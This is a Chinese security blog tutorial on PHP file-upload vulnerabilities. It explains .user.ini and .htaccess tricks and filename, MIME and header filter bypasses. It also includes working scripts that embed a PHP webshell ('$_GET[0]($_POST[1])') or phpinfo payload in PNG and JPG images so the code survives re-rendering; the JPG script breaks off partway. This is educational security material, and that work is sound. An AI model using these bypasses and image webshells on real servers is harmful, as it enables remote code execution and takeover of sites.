<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Upload（文件上传漏洞） | Tawnx's Blog</title><meta name="author" content="Tawnx"><meta name="copyright" content="Tawnx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Upload（文件上传漏洞）简介我们在使用HTTP访问Web服务的时候，实际上是在访问服务器上的文件。而文件上传功能是一个正常的业务需求，但是如果不加以检查，会造成许多安全问题：例如，如果黑客能够通过其上传一个可执行的脚本文件到可访问的目录内，再访问它，就获得了执行服务器端命令的能力。又或者上传文件的是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。除此之外，还可以以上传文件作为一个入口，溢出">
<meta property="og:type" content="article">
<meta property="og:title" content="Upload（文件上传漏洞）">
<meta property="og:url" content="http://blog.tawnx.com/2022/08/09/Upload/index.html">
<meta property="og:site_name" content="Tawnx&#39;s Blog">
<meta property="og:description" content="Upload（文件上传漏洞）简介我们在使用HTTP访问Web服务的时候，实际上是在访问服务器上的文件。而文件上传功能是一个正常的业务需求，但是如果不加以检查，会造成许多安全问题：例如，如果黑客能够通过其上传一个可执行的脚本文件到可访问的目录内，再访问它，就获得了执行服务器端命令的能力。又或者上传文件的是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。除此之外，还可以以上传文件作为一个入口，溢出">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2022-08-09T09:14:38.000Z">
<meta property="article:modified_time" content="2023-01-10T13:15:20.000Z">
<meta property="article:author" content="Tawnx">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="Upload">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.tawnx.com/2022/08/09/Upload/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Upload（文件上传漏洞）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-10 21:15:20'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Tawnx's Blog"><span class="site-name">Tawnx's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Upload（文件上传漏洞）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-08-09T09:14:38.000Z" title="Created 2022-08-09 17:14:38">2022-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-01-10T13:15:20.000Z" title="Updated 2023-01-10 21:15:20">2023-01-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">web安全基础漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Upload（文件上传漏洞）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Upload（文件上传漏洞）"><a href="#Upload（文件上传漏洞）" class="headerlink" title="Upload（文件上传漏洞）"></a>Upload（文件上传漏洞）</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>我们在使用HTTP访问Web服务的时候，实际上是在访问服务器上的文件。而文件上传功能是一个正常的业务需求，但是如果不加以检查，会造成许多安全问题：例如，如果黑客能够通过其上传一个可执行的脚本文件到可访问的目录内，再访问它，就获得了执行服务器端命令的能力。又或者上传文件的是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。除此之外，还可以以上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块。诸如此类。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="通过-user-ini包含文件"><a href="#通过-user-ini包含文件" class="headerlink" title="通过.user.ini包含文件"></a>通过.user.ini包含文件</h3><p>.user.ini是一种基于每个目录的 INI 配置文件，作用域在.user.ini所在目录及其子目录，优先级高于php.ini。即除了主 php.ini 之外，执行PHP脚本时，PHP还会在当前目录下扫描 INI 文件，如果扫描到了，就使用.user.ini中的配置，如果当前目录没有扫描到，到上一级目录继续扫描，直到达到web根目录。详情：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p>
<p>可以通过上传它，来修改当前所访问php脚本所使用的配置项，达到文件包含等目的。但是需要满足几个条件：</p>
<ol>
<li>当前目录已有php文件可以访问</li>
<li>配置项的<strong>配置可被设定范围</strong>是 <code>PHP_INI_PERDIR</code> 或者 <code>PHP_INI_USER</code></li>
</ol>
<p>那么什么是<strong>配置可被设定范围</strong>呢？我们都知道php.ini是php默认的配置文件，其中包括了很多php的配置，例如 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include">allow_url_include</a> 等。这些配置中，又有对应的”配置可被设定范围”，即某个配置能在哪被修改，”配置可被设定范围”有四种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php%E3%80%82%E5%9C%A8">https://www.php.net/manual/zh/ini.list.php。在</a> .user.ini 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
<p>在php配置项中有这么一个配置：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file">auto_append_file</a>，好像是执行php脚本后自动调用 require 函数，且它的配置可被设定范围是 <code>PHP_INI_PERDIR</code>。</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E6%88%AA%E5%B1%8F2022-08-15-%E4%B8%8B%E5%8D%888.49.45.png" alt="img"></p>
<p>就可以写入下面内容到.user.ini，上传文件。其中 <code>eval.txt</code> 是要包含的文件名，因为用的是require函数，也可以是png文件，也可以是php伪协议，但是似乎不能包含 <code>=()</code>，因为不知道怎么转义。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_append_file=eval.txt</span><br></pre></td></tr></table></figure>

<p>然后上传 eval.txt 文件，.user.ini生效后，访问本目录或子目录的php文件，可以发现成功被require了。</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E6%88%AA%E5%B1%8F2022-08-15-%E4%B8%8B%E5%8D%889.04.09.png" alt="img"></p>
<h3 id="利用-htaccess"><a href="#利用-htaccess" class="headerlink" title="利用.htaccess"></a>利用.htaccess</h3><p>.htaccess和.user.ini类似，都是基于目录的配置文件，但是.htaccess是Apache的配置文件，而.user.ini是php的配置文件。</p>
<p>比较常用的命令有，SetHandler指令。例如下面代码将1.png当作php执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>也可以使用AddType将所有的.png文件当作php文件解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>

<p>更多利用方式：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/328241.html">https://www.freebuf.com/articles/web/328241.html</a></p>
<h2 id="过滤方法及其绕过"><a href="#过滤方法及其绕过" class="headerlink" title="过滤方法及其绕过"></a>过滤方法及其绕过</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>前端js或者html代码来阻止不允许的文件上传。</p>
<p>可以通过直接修改html代码来实现，例如把下图的png改为要上传的文件类型php。</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E5%9B%BE%E7%89%87.png" alt="img"></p>
<p>也可以先将要上传的文件改成合法后缀，抓包拦截，修改为原先的后缀php后，再进行上传。</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E6%88%AA%E5%B1%8F2022-08-15-%E4%B8%8B%E5%8D%885.40.51.png" alt="img"></p>
<h3 id="MIME-type-检测"><a href="#MIME-type-检测" class="headerlink" title="MIME type 检测"></a>MIME type 检测</h3><p>如果只校验了MIME type，可以直接拦截并修改，如下图</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E5%9B%BE%E7%89%87-1.png" alt="img"></p>
<h3 id="文件名检测"><a href="#文件名检测" class="headerlink" title="文件名检测"></a>文件名检测</h3><h4 id="使用其他可解析文件名"><a href="#使用其他可解析文件名" class="headerlink" title="使用其他可解析文件名"></a>使用其他可解析文件名</h4><p>如果黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。<br><code>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml|phar</code></p>
<h4 id="使用0x00截断"><a href="#使用0x00截断" class="headerlink" title="使用0x00截断"></a>使用0x00截断</h4><p>应用原本只允许上传 JPG 图片，那么可以构造文件名为 <code>xxx.php\0.JPG</code>，其中 <code>\0</code> 为十六进制的 <code>0x00</code> 字符，<code>.JPG</code> 绕过了应用的上传文件类型判断，但对于服务器端来说，此文件因为 <code>\0</code> 字节截断的关系，最终却写入服务器的文件名为 <code>xxx.php</code>。</p>
<p>以上内容是《白帽》中的描述，但是经过实测（php5.2.16），PHP收到的数据中，<code>.png</code> 已经被空字符截断，类型还是php，效果和文件名直接不写 <code>.png</code> 是一样的。</p>
<p>还有POST请求发送数据时，因为enctype的属性，不会对数据进行解码，所以需要发送的是 <code>0x00</code> 字符，可以使用 <code>%00</code> 然URL解码，否则写入的文件名是 %00 字符。</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E5%9B%BE%E7%89%87-3.png" alt="img"></p>
<p>经过查阅发现，虽然不能直接使用，但是如果能控制上传后文件的目录，也许就可以用。利用条件：PHP&lt;5.3.29，且GPC关闭</p>
<p>比如数据包中存在path: <code>uploads/</code>，那么攻击者可以通过修改path的值来构造paylod: <code>uploads/eval.php\0</code></p>
<p>因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：<code>uploads/eval.php\0eval.png</code>，移动文件的时候会将文件保存为<code>uploads/eval.php</code></p>
<p>即文件路径全由传入的path参数提供，本身上传的文件名只要能过黑或者白名单即可。同时，使用此种方法也无惧文件重命名。如下图：</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E5%9B%BE%E7%89%87-2.png" alt="img"></p>
<p>而因为echo的特性，可以输出多个文本，即便中间有一个空字符，也不会隔断。所以能看到返回的 <code>Stored in: uploads/eval.phpeval.png</code></p>
<h4 id="利用-DATA"><a href="#利用-DATA" class="headerlink" title="利用::$DATA"></a>利用::$DATA</h4><p>在window的时候如果文件名末尾是::$DATA，则会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名</p>
<p>例如: <code>info.php::$DATA</code> Windows会自动去掉末尾的 <code>::$DATA</code> 变成 <code>info.php</code></p>
<h4 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h4><p>Apache、Nginx、IIS6 都有后缀解析漏洞，但是年代久远，利用条件苛刻。</p>
<p>Apache换行解析漏洞：在2.4.0~2.4.29版本存在一个解析漏洞，在解析php时，<code>1.php\x0A</code> 将按照php后缀进行解析</p>
<p>Apache多后缀解析漏洞：2.2.x版本下，需要配置 <code>AddHandler application/x-httpd-php .php</code> ，只要文件名里有 ‘<code>.php</code>‘ 就当作php脚本解析。</p>
<p>Nginx 通过访问图片的时候添加后缀 <code>%00.php</code> 或者 <code>/xx.php</code> 来欺骗引擎，使其当作脚本解析</p>
<p>IIS6 中则是把文件名为 <code>abc.asp;xx.jpg</code> 的文件当作asp脚本解析，因为它会忽略 <code>;</code> 及之后的内容，又或者将 <code>/*.asp/</code> 目录下的所有文件都作为 ASP 文件进行解析</p>
<p>还有一些方法：利用系统命名等</p>
<h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><p>很简单，添加即可，可以拿图片改<br>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638</p>
<h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><p>在图片上传的实际开发中不应该单纯的检测文件内容，但是在ctf中可能会出现。</p>
<h4 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h4><p>上传文件后，有些网站会对图片进行二次处理（格式、尺寸要求等），这时写的图片马可能就失效了</p>
<p><strong>GIF</strong></p>
<p>可以先上传正常的图片，然后再下载，查看不变的数据，然后把一句话插入图片在二次渲染后会保留的那部分数据里。</p>
<p><strong>PNG</strong></p>
<p><strong>第一种方法：写入PLTE数据块</strong></p>
<p>PLTE数据块对于PNG图片来说是可选的，索引彩色图像的PNG图片才有PLTE数据块。同时php底层在对PLTE数据块验证的时候，主要进行了CRC校验。所以可以再chunk data域插入php代码，然后重新计算相应的crc值并修改即可。PNG数据块格式可以参考：<a target="_blank" rel="noopener" href="https://www.twblogs.net/a/610e888e1cf175147a0e7f96">https://www.twblogs.net/a/610e888e1cf175147a0e7f96</a></p>
<p>样例图片</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/PNG_WITH_PLTE.png" alt="img"></p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E6%88%AA%E5%B1%8F2022-08-19-%E4%B8%8B%E5%8D%883.26.35.png" alt="img"></p>
<table>
<thead>
<tr>
<th>十六进制</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>00 00 00 27</td>
<td>數據塊長度 39 字節</td>
</tr>
<tr>
<td>50 4C 54 45</td>
<td>數據塊類型碼 “PLTE” 的 ASCII 字母</td>
</tr>
<tr>
<td><strong>B7 00 34</strong> FF 99 00 <strong>60 00 73</strong> FF 0F 00 <strong>FF ED 00</strong> 09 00 B2 <strong>FF 66 00</strong> FF 3B 00 <strong>E2 00 15</strong> <strong>8B 00 54</strong> FF C1 00 <strong>33 00 99</strong> FF FF 00</td>
<td>調色板顏色 13 個</td>
</tr>
<tr>
<td>48 29 75 2C</td>
<td>CRC (循環冗餘檢測)</td>
</tr>
</tbody></table>
<ol>
<li>在PLTE数据块写入php代码，字节长度必须是3的倍数；</li>
<li>计算PLTE数据长度，修改长度，也就是最开始的 <code>00 00 00 27</code> 部分</li>
<li>使用下列脚本(python2)计算PLTE数据块的CRC，并修改</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">png = open(r&#x27;1.png&#x27;,&#x27;rb&#x27;)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br><span class="line">data =  &#x27;504c5445&#x27;+ re.findall(&#x27;504c5445(.*?)70485973&#x27;,hexstr)[0]</span><br><span class="line">crc = binascii.crc32(data[:-16].decode(&#x27;hex&#x27;)) &amp; 0xffffffff</span><br><span class="line">print(hex(crc))</span><br></pre></td></tr></table></figure>

<p>代码中 <code>70485973</code> 是PLTE下一个数据块的名称的hex，这里是pHYs。修改完后：</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E6%88%AA%E5%B1%8F2022-08-19-%E4%B8%8B%E5%8D%883.41.22.png" alt="img"></p>
<p><strong>第二种方法：写入IDAT数据块</strong></p>
<p>可以使用简易的脚本生成PNG图片，生成的图片包含的php脚本是 <code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上传后php脚本仍然保留</p>
<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-08/%E6%88%AA%E5%B1%8F2022-08-19-%E4%B8%8B%E5%8D%881.39.53.png" alt="img"></p>
<p>也可以用 <a target="_blank" rel="noopener" href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a> 自定义写入的脚本。</p>
<p><strong>JPG</strong></p>
<p>由于jpg图片易损，对图片的选取有很大关系，很容易制作失败，国外大牛脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#x27;gd&#x27;) || !function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123;</span><br><span class="line">        die(&#x27;php-gd is not installed&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!isset($argv[1])) &#123;</span><br><span class="line">        die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(&quot;custom_error_handler&quot;);</span><br><span class="line"></span><br><span class="line">    for($pad = 0; $pad &lt; 1024; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[1]);</span><br><span class="line">        $outStream = file_get_contents($argv[1]);</span><br><span class="line">        $extraBytes = 0;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(&#x27;Incorrect SOI marker&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            if($marker === 0xDA) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, 0, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE);</span><br><span class="line">                if($extraBytes !== 0) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                break;</span><br><span class="line">        